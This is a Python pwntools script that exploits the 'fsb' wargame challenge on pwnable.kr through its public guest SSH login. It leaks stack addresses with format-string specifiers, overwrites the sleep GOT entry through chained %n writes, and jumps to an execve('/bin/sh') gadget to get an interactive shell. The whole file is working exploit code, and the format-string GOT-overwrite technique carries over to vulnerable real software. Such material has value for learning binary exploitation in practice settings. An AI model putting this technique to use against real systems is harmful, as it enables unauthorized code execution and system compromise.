#!/usr/bin/env python
#! -*- coding: utf-8 -*-
from pwn import *

# note use raw_input to prevent program crash
context.update(arch="i386", os="linux", bits=32)
elf = ELF("fsb")
# p = process("./fsb")
p = ssh(user="fsb", password="guest", host="pwnable.kr", port=2222).run("/home/fsb/fsb")

ebp = "%18$08p"   # ebp is on stack+0x72
esp = "%14$08p"   # esp is on [stack+0x56] - 0x50
offset = 0x50
shell = 0x080486ab  # execve("/bin/sh", 0)
sleep = elf.got["sleep"]

log.success("shell: 0x%08x" % shell)
log.success("sleep got: 0x%08x" % sleep)

raw_input('@')
p.recvline()
p.sendline(ebp)
ebp = int(p.recvline().strip(), base=16)
log.success("ebp is 0x%08x" % ebp)

raw_input('@')
p.recvline()
p.sendline(esp)
esp = int(p.recvline().strip(), base=16) - offset
log.success("esp is 0x%08x" % esp)
offset = (ebp - esp)/4
log.success("offset is %s" % offset)

raw_input('@')
p.recvline()
fmt = "%%%dc" % (sleep) + "%18$n"
p.sendline(fmt)
p.recvline()

raw_input('@')
p.recvline()
fmt = "%%%dc" % (shell&0xffff) + "%%%d$hn" % offset
p.sendline(fmt)

raw_input('@')
p.interactive()
p.close()
